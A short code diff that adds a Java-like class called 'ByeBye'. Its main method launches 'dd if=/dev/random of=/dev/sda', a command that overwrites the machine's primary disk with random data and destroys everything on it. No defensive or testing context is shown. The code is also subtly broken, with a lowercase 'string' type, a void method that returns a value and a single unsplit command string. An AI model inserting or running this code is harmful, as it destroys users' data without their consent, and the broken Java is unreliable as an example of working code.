@@ -1,0 +1,7 @@
+class ByeBye {
+    void main() {
+        string command = "dd if=/dev/random of=/dev/sda";
+        ProcessBuilder builder = new ProcessBuilder(command);
+        Process process = builder.inheritIO().start();
+    return process.exitValue();
+}}
